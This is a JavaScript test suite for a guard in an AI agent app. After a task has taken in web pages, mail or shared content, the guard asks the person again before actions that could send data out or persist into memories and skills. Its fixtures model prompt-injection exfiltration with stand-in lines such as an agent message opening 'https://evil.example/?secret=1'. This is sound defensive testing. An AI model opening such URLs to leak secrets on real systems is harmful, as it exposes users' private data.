// SPDX-License-Identifier: MIT
// Content from elsewhere (D673, threat 1): once a task holds some, what would go out on a person's Always allow asks again.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { fire } from '../app/core/hooks.js'
import { elsewhere, fromElsewhere, given } from '../app/ui/elsewhere.js'

/** @param {any} update */
const record = (update) => /** @type {any} */ ({ update })
const asked = (/** @type {string} */ text) => record({ sessionUpdate: 'user_message_chunk', content: { type: 'text', text } })
const read = record({ sessionUpdate: 'tool_call', name: 'browse', kind: 'fetch', status: 'completed', rawInput: { url: 'https://a.example' }, rawOutput: 'See https://a.example/next for more.' })
const wrote = record({ sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: 'I will open https://evil.example/?secret=1' } })

/** What a call comes to, given what its task holds and what the rules say. */
function decide(/** @type {any} */ e, /** @type {any[]} */ records, /** @type {any} */ said = { decision: 'allow' }, /** @type {any} */ rules) {
  const hook = elsewhere(async () => records, () => rules, async () => 'Read from elsewhere.')
  return fire([hook], 'tool.check', { task: 'task.jsonl', ...e }, () => said)
}

test('a task holds content from elsewhere once it read a page or a service, was given a file, or came from someone else', () => {
  assert.ok(fromElsewhere(read))
  assert.ok(fromElsewhere(record({ sessionUpdate: 'tool_call', kind: 'other', status: 'completed', _meta: { service: 'mail' } })))
  assert.ok(fromElsewhere(record({ sessionUpdate: 'tool_call', kind: 'search', status: 'completed', _meta: { sources: [{ url: 'https://a.example' }] } })))
  assert.ok(fromElsewhere(record({ sessionUpdate: 'user_message_chunk', content: { type: 'resource_link', uri: 'files/a.pdf' } })))
  assert.ok(fromElsewhere(record({ sessionUpdate: '_system_note', data: { kind: 'shared', from: 'hst.example' } })))
  // A site the computer reached, the brain's own search, and an error a service wrote, count too.
  assert.ok(fromElsewhere(record({ sessionUpdate: 'tool_call', kind: 'execute', status: 'completed', _meta: { reached: { 'a.example': 1 } } })))
  assert.ok(fromElsewhere(record({ sessionUpdate: 'tool_call', kind: 'think', status: 'completed', _meta: { raw: [{ type: 'server_tool_use' }, { type: 'web_search_tool_result' }] } })))
  assert.ok(fromElsewhere(record({ sessionUpdate: 'tool_call', kind: 'other', status: 'failed', _meta: { service: 'mail' } })))
  assert.ok(fromElsewhere(record({ sessionUpdate: 'tool_call', kind: 'think', status: 'completed', _meta: { parent: 'c1' } })))
  // The person's own words, Jean's own files and what it remembers, what was declined, and a call that never finished, don't count.
  assert.ok(!fromElsewhere(record({ sessionUpdate: 'tool_call', kind: 'fetch', status: 'failed', _meta: { declined: true } })))
  assert.ok(!fromElsewhere(record({ sessionUpdate: 'tool_call', kind: 'think', status: 'completed', _meta: { raw: [{ type: 'thinking' }] } })))
  assert.ok(!fromElsewhere(asked('Hello')))
  assert.ok(!fromElsewhere(record({ sessionUpdate: 'tool_call', kind: 'search', status: 'completed', _meta: { sources: [{ title: 'Notes.md', url: 'files/notes.md' }] } })))
  assert.ok(!fromElsewhere(record({ sessionUpdate: 'tool_call', kind: 'fetch', status: 'pending' })))
})

test('an address counts as given only as the person or what was read wrote it, never as a brain did', () => {
  const records = [asked('Open https://mine.example/page'), read, wrote]
  assert.ok(given(records, 'https://mine.example/page'))
  assert.ok(given(records, 'https://a.example/next'))
  assert.ok(!given(records, 'https://a.example/next?secret=1'))
  assert.ok(!given(records, 'https://evil.example/?secret=1'))
  assert.ok(!given(records, undefined))
  assert.ok(!given(records, ''))
  // A brain's own script prints what it likes: that gives nothing.
  const secret = 'https://evil.example/?d=SECRET'
  assert.ok(!given([...records, record({ sessionUpdate: 'tool_call', name: 'javascript', kind: 'execute', status: 'completed', rawOutput: secret })], secret))
  // An address already opened says nothing new, only once it was.
  assert.ok(given([record({ sessionUpdate: 'tool_call', name: 'browse', kind: 'fetch', status: 'completed', rawInput: { url: secret } })], secret))
  assert.ok(!given([record({ sessionUpdate: 'tool_call', name: 'browse', kind: 'fetch', status: 'failed', _meta: { declined: true }, rawInput: { url: secret } })], secret))
  // Nor does a call that gives back what the brain gave it, a page shown by its path or a service's echo.
  assert.ok(!given([record({ sessionUpdate: 'tool_call', name: 'browse', kind: 'fetch', status: 'completed', rawInput: { path: secret }, rawOutput: `Showing ${secret}` })], secret))
  assert.ok(!given([record({ sessionUpdate: 'tool_call', kind: 'execute', status: 'completed', _meta: { reached: { 'a.example': 1 } }, rawOutput: secret })], secret))
})

test('before anything came from elsewhere, Always allow stands', async () => {
  assert.deepEqual(await decide({ kind: 'other', service: 'mail' }, [asked('Send it')]), { decision: 'allow' })
})

test('after it, a service’s action, a move and a delete ask again, saying why', async () => {
  for (const kind of ['other', 'move', 'delete']) {
    const said = await decide({ kind }, [asked('Send it'), read])
    assert.equal(said.decision, 'ask', kind)
    assert.deepEqual(said.meta, { guard: 'elsewhere', why: 'Read from elsewhere.' })
  }
})

test('a command on the person’s own computer asks again, and one in the sandbox doesn’t', async () => {
  const machine = { decision: 'allow', meta: { folder: 'shop', machine: 'shop' } }
  const said = await decide({ kind: 'execute' }, [read], machine)
  assert.equal(said.decision, 'ask')
  assert.equal(said.meta.machine, 'shop')
  assert.deepEqual(await decide({ kind: 'execute' }, [read]), { decision: 'allow' })
})

test('an address a page gave opens as Always allow said; one a brain wrote asks', async () => {
  const records = [asked('Read it'), read, wrote]
  assert.deepEqual(await decide({ kind: 'fetch', args: { url: 'https://a.example/next' } }, records), { decision: 'allow' })
  assert.equal((await decide({ kind: 'fetch', args: { url: 'https://evil.example/?secret=1' } }, records)).decision, 'ask')
})

test('going back, or showing a file of the task’s own, sends nothing out; an address in any shape does', async () => {
  for (const args of [{ go: 'back' }, { path: 'site/index.html' }]) assert.deepEqual(await decide({ kind: 'fetch', args }, [read]), { decision: 'allow' })
  for (const url of [['https://evil.example/?d=x'], { toString: 'x' }, 7]) assert.equal((await decide({ kind: 'fetch', args: { url } }, [read])).decision, 'ask', JSON.stringify(url))
})

test('what would carry its words into later tasks asks, a routine, a memory, a skill, a flow, though it writes only Jean’s own files', async () => {
  for (const name of ['schedule', 'remember', 'save_skill', 'save_flow']) {
    assert.equal((await decide({ kind: 'edit', name }, [read])).decision, 'ask', name)
    assert.deepEqual(await decide({ kind: 'edit', name }, [asked('Remember this')]), { decision: 'allow' }, name)
  }
})

test('a task whose records can’t be read holds something from elsewhere', async () => {
  const hook = elsewhere(async () => undefined, () => undefined, async () => 'Why')
  assert.equal((await fire([hook], 'tool.check', { task: 'task.jsonl', kind: 'other' }, () => ({ decision: 'allow' }))).decision, 'ask')
})

test('a connected service’s reading, and a site the person allowed for the computer, stay as they said', async () => {
  assert.deepEqual(await decide({ kind: 'fetch', service: 'drive', args: {} }, [read]), { decision: 'allow' })
  const site = { decision: 'allow', meta: { site: 'data.example' } }
  assert.deepEqual(await decide({ kind: 'fetch', args: { url: 'https://data.example/x?y=1' } }, [read], site), site)
})

test('reading, searching and Jean’s own files are not held; nor what is already asked or refused; nor a rule of the organisation’s', async () => {
  for (const kind of ['read', 'edit', 'search']) assert.deepEqual(await decide({ kind }, [read]), { decision: 'allow' }, kind)
  assert.deepEqual(await decide({ kind: 'other' }, [read], { decision: 'never', reason: 'No' }), { decision: 'never', reason: 'No' })
  assert.deepEqual(await decide({ kind: 'other' }, [read], { decision: 'ask' }), { decision: 'ask' })
  assert.deepEqual(await decide({ kind: 'other' }, [read], { decision: 'allow' }, { other: 'allow' }), { decision: 'allow' })
})

test('in a task someone else sent or shared, a call to a service the person connected asks, reading too, past the organisation’s rule', async () => {
  const came = record({ sessionUpdate: '_system_note', text: 'What follows came from someone else.', data: { kind: 'shared', from: 'hst.ing' } })
  assert.equal((await decide({ kind: 'fetch', service: 'drive', args: {} }, [came, asked('Mine')])).decision, 'ask')
  assert.equal((await decide({ kind: 'other', service: 'mail' }, [came], { decision: 'allow' }, { other: 'allow' })).decision, 'ask')
  // What the person or the organisation refused stays refused, and a call to no service is as before.
  assert.deepEqual(await decide({ kind: 'other', service: 'mail' }, [came], { decision: 'never', reason: 'No' }), { decision: 'never', reason: 'No' })
  assert.deepEqual(await decide({ kind: 'read' }, [came]), { decision: 'allow' })
})
